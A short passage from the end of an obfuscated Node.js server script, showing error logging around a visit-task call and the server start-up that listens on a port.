AddVisitTask();}catch(_0x482096){console['error'](_0x3ea661(0x116),_0x482096);}}startserver()[_0xefc5af(0xe3)](_0x314966=>{const _0x54f86d=_0xefc5af;console[_0x54f86d(0xf9)]('Unhandled\x20error\x20in\x20startserver:',_0x314966);}),app[_0xefc5af(0xc9)](PORT,()=>console[_0xefc5af(0x98)]('http\x20server\x20is\x20running\x20on\x20port:'+PORT+'!'));
